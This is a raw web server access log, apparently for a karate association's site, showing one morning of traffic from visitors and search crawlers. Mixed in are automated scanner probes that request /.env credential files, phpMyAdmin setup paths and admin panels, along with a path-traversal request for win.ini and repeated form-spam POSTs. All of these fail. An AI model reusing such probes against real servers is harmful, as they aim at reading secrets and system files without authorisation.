::ffff:37.139.53.81 - - [08/Sep/2022:07:19:57 +0000] "GET / HTTP/1.0" 200 58442 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:37.139.53.81 - - [08/Sep/2022:07:19:58 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:37.139.53.81 - - [08/Sep/2022:07:19:59 +0000] "GET /?err=error HTTP/1.0" 200 58994 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:135.125.246.189 - - [08/Sep/2022:07:43:40 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [08/Sep/2022:07:43:40 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.79.172 - - [08/Sep/2022:07:47:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.170 - - [08/Sep/2022:07:47:15 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:157.55.39.226 - - [08/Sep/2022:07:55:23 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:51.13.181.144 - - [08/Sep/2022:08:03:08 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:51.13.181.144 - - [08/Sep/2022:08:03:09 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:51.13.181.144 - - [08/Sep/2022:08:03:09 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:51.13.181.144 - - [08/Sep/2022:08:03:10 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:45.79.171.66 - - [08/Sep/2022:08:08:26 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:34.67.240.65 - - [08/Sep/2022:08:08:42 +0000] "GET /images/AlamedaBestof2019.jpg HTTP/1.1" 200 80518 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
::ffff:135.125.246.189 - - [08/Sep/2022:08:11:17 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [08/Sep/2022:08:11:18 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:178.79.169.253 - - [08/Sep/2022:08:17:08 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
::ffff:157.55.39.203 - - [08/Sep/2022:08:27:01 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.79.180 - - [08/Sep/2022:08:32:15 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.99 - - [08/Sep/2022:08:48:05 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:193.235.141.169 - - [08/Sep/2022:08:59:36 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:193.235.141.169 - - [08/Sep/2022:08:59:37 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:154.209.125.68 - - [08/Sep/2022:09:13:08 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:43.136.180.34 - - [08/Sep/2022:09:16:14 +0000] "GET http://34.212.47.6:80/pma/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:43.136.180.34 - - [08/Sep/2022:09:16:14 +0000] "GET http://34.212.47.6:80/mysql/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:43.136.180.34 - - [08/Sep/2022:09:16:14 +0000] "GET http://34.212.47.6:80/db/scripts/setup.php HTTP/1.0" 404 159 "-" "-"
::ffff:43.136.180.34 - - [08/Sep/2022:09:16:14 +0000] "GET http://34.212.47.6:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:66.249.79.184 - - [08/Sep/2022:09:17:15 +0000] "GET /style.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:114.119.145.19 - - [08/Sep/2022:09:27:50 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:37.139.53.81 - - [08/Sep/2022:09:33:55 +0000] "GET / HTTP/1.0" 200 58442 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4102.0 Safari/537.36"
::ffff:37.139.53.81 - - [08/Sep/2022:09:33:56 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4102.0 Safari/537.36"
::ffff:37.139.53.81 - - [08/Sep/2022:09:33:57 +0000] "GET /?err=error HTTP/1.0" 200 58994 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4102.0 Safari/537.36"
::ffff:128.1.248.42 - - [08/Sep/2022:09:38:00 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:207.46.13.99 - - [08/Sep/2022:09:41:09 +0000] "GET /shinko-katas.html HTTP/1.1" 404 156 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.208 - - [08/Sep/2022:09:42:03 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:37.139.53.86 - - [08/Sep/2022:09:43:00 +0000] "GET / HTTP/1.0" 200 58442 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.86 - - [08/Sep/2022:09:43:00 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.86 - - [08/Sep/2022:09:43:01 +0000] "GET /?err=error HTTP/1.0" 200 58994 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:18.237.225.176 - - [08/Sep/2022:09:58:18 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.237.225.176 - - [08/Sep/2022:09:58:20 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:40 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:41 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:42 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:43 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:44 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:45 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:46 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:46 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:47 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:47 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:48 +0000] "GET /contact HTTP/1.1" 200 10017 "http://wadokikai.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:48 +0000] "POST /sendemail HTTP/1.1" 302 96 "http://wadokikai.org/contact?s=1&ss=7" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:144.168.227.69 - - [08/Sep/2022:10:01:49 +0000] "GET /contact/?msg=sent&s=1 HTTP/1.1" 200 10400 "http://wadokikai.org/sendemail" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71"
::ffff:207.46.13.101 - - [08/Sep/2022:10:04:22 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:80.87.206.248 - - [08/Sep/2022:10:05:46 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
::ffff:80.87.206.248 - - [08/Sep/2022:10:05:46 +0000] "GET /Public/home/js/check.js HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
::ffff:80.87.206.248 - - [08/Sep/2022:10:05:46 +0000] "GET /static/admin/javascript/hetong.js HTTP/1.1" 404 172 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
::ffff:51.222.253.9 - - [08/Sep/2022:10:20:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [08/Sep/2022:10:20:38 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:135.125.246.189 - - [08/Sep/2022:10:22:11 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [08/Sep/2022:10:22:11 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.69.94 - - [08/Sep/2022:10:40:00 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:34.88.103.82 - - [08/Sep/2022:10:43:09 +0000] "OPTIONS / HTTP/1.0" 200 8 "-" "-"
::ffff:45.61.185.15 - - [08/Sep/2022:10:46:53 +0000] "GET / HTTP/1.1" 200 58442 "-" "python-requests/2.27.1"
::ffff:66.249.79.170 - - [08/Sep/2022:10:47:15 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:157.55.39.203 - - [08/Sep/2022:10:52:06 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.226 - - [08/Sep/2022:10:59:20 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.69.94 - - [08/Sep/2022:11:02:40 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 200 3578 "-" "Googlebot-Image/1.0"
::ffff:101.43.68.37 - - [08/Sep/2022:11:07:14 +0000] "GET http://34.212.47.6:80/pma/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:101.43.68.37 - - [08/Sep/2022:11:07:14 +0000] "GET http://34.212.47.6:80/mysql/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:101.43.68.37 - - [08/Sep/2022:11:07:14 +0000] "GET http://34.212.47.6:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:101.43.68.37 - - [08/Sep/2022:11:07:14 +0000] "GET http://34.212.47.6:80/db/scripts/setup.php HTTP/1.0" 404 159 "-" "-"
::ffff:157.55.39.203 - - [08/Sep/2022:11:09:37 +0000] "GET /login.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:193.46.255.199 - - [08/Sep/2022:11:12:04 +0000] "GET /Electron/download/windows/\Windows\win.ini HTTP/1.0" 404 185 "-" "xfa1"
::ffff:66.249.69.94 - - [08/Sep/2022:11:25:10 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 200 7644 "-" "Googlebot-Image/1.0"
::ffff:194.165.17.23 - - [08/Sep/2022:11:32:57 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"
::ffff:194.165.17.23 - - [08/Sep/2022:11:32:57 +0000] "GET /portal/webclient/index.html HTTP/1.1" 404 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"
::ffff:135.125.246.189 - - [08/Sep/2022:11:40:04 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [08/Sep/2022:11:40:05 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:52.226.210.206 - - [08/Sep/2022:11:40:06 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:52.226.210.206 - - [08/Sep/2022:11:40:10 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
::ffff:35.194.72.67 - - [08/Sep/2022:11:42:13 +0000] "OPTIONS / HTTP/1.0" 200 8 "-" "-"
::ffff:54.36.148.236 - - [08/Sep/2022:11:46:57 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [08/Sep/2022:11:46:59 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [08/Sep/2022:11:47:04 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [08/Sep/2022:11:47:05 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [08/Sep/2022:11:47:05 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [08/Sep/2022:11:47:06 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [08/Sep/2022:11:47:07 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [08/Sep/2022:11:47:07 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [08/Sep/2022:11:47:08 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [08/Sep/2022:11:47:08 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [08/Sep/2022:11:47:09 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [08/Sep/2022:11:47:10 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [08/Sep/2022:11:47:16 +0000] "GET /images/tournaments/NKD8202022.jpg HTTP/1.1" 200 493189 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [08/Sep/2022:11:47:17 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [08/Sep/2022:11:47:17 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [08/Sep/2022:11:47:18 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [08/Sep/2022:11:47:18 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:37.139.53.81 - - [08/Sep/2022:11:47:52 +0000] "GET / HTTP/1.0" 200 58442 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.81 - - [08/Sep/2022:11:47:53 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.81 - - [08/Sep/2022:11:47:53 +0000] "GET /?err=error HTTP/1.0" 200 58994 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:95.214.235.205 - - [08/Sep/2022:12:05:28 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [08/Sep/2022:12:05:29 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:37.139.53.86 - - [08/Sep/2022:12:13:48 +0000] "GET / HTTP/1.0" 200 58442 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.86 - - [08/Sep/2022:12:13:48 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.86 - - [08/Sep/2022:12:13:49 +0000] "GET /?err=error HTTP/1.0" 200 58994 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:66.249.79.172 - - [08/Sep/2022:12:17:15 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:143.92.32.88 - - [08/Sep/2022:12:27:32 +0000] "GET / HTTP/1.1" 200 58442 "-" "<title>(.*?)</title>"
::ffff:66.249.69.92 - - [08/Sep/2022:12:42:31 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:135.125.246.189 - - [08/Sep/2022:12:50:10 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [08/Sep/2022:12:50:10 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.69.94 - - [08/Sep/2022:13:05:01 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 200 22573 "-" "Googlebot-Image/1.0"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:51 +0000] "GET /admin/index.php?lang=en HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:51 +0000] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:52 +0000] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:52 +0000] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
